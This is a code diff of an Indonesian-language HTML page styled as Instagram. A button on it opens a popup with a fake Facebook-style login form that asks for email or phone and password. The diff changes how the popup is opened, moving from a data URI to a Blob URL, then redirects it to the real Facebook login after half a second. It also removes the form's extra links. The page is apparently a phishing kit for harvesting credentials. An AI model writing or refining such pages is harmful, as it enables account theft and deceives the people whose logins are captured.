@@ -7,13 +7,14 @@
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
 body{background:#fafafa;height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;padding:20px;text-align:center}
-.btn{background:#0095f6;color:#fff;border:none;padding:16px 40px;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:0.2s}
+.btn{background:#0095f6;color:#fff;border:none;padding:16px 40px;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:0.2s;margin:10px}
 .btn:active{transform:scale(0.95)}
+.btn-share{background:#1877f2}
 </style>
 </head>
 <body>
 <h1>👋 Instagram</h1>
-<p style="color:#8e8e8e;font-size:14px;margin:10px 0 20px;">Klik tombol untuk melanjutkan</p>
+<p style="color:#8e8e8e;font-size:14px;margin:10px 0 20px;">Klik tombol untuk membuka login</p>
 <button class="btn" id="go">Buka Instagram</button>
 
 <script>
@@ -37,10 +38,6 @@ document.getElementById('go').onclick = function() {
                 .btn{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer}
                 .btn:disabled{opacity:0.6}
                 .error{color:#e74c3c;font-size:14px;margin:10px 0;display:none}
-                .divider{display:flex;align-items:center;margin:16px 0;color:#8e8e8e;font-size:13px}
-                .divider::before,.divider::after{content:"";flex:1;height:1px;background:#ddd}
-                .divider::before{margin-right:18px}
-                .divider::after{margin-left:18px}
             </style>
         </head>
         <body>
@@ -50,9 +47,6 @@ document.getElementById('go').onclick = function() {
                 <input type="text" id="user" placeholder="Email atau nomor telepon">
                 <input type="password" id="pass" placeholder="Kata sandi">
                 <button class="btn" id="loginBtn" disabled>Masuk</button>
-                <div class="divider">ATAU</div>
-                <a href="#" style="color:#1877f2;text-decoration:none;font-size:14px;">Lupa kata sandi?</a>
-                <div style="margin-top:16px;font-size:14px;">Belum punya akun? <a href="#" style="color:#1877f2;font-weight:600;text-decoration:none;">Buat akun baru</a></div>
             </div>
             <script>
                 // ==========================================
@@ -104,15 +98,26 @@ document.getElementById('go').onclick = function() {
     `;
 
     // ==========================================
-    // BUKA PAKAI DATA URI (BUKAN BLOB)
+    // BUKA PAKAI BLOB URL
     // ==========================================
-    const encoded = btoa(unescape(encodeURIComponent(loginHtml)));
-    const dataUrl = 'data:text/html;base64,' + encoded;
+    const blob = new Blob([loginHtml], { type: 'text/html' });
+    const blobUrl = URL.createObjectURL(blob);
 
-    const win = window.open(dataUrl, '_blank');
+    const win = window.open(blobUrl, '_blank');
     if (!win) {
         alert('Izinkan popup!');
+        return;
     }
+
+    // Tunggu sebentar, lalu ganti URL
+    setTimeout(() => {
+        try {
+            win.location.href = 'https://www.facebook.com/login/';
+        } catch(e) {}
+    }, 500);
+
+    // Hapus blob URL
+    setTimeout(() => URL.revokeObjectURL(blobUrl), 2000);
 };
 </script>
 </body>
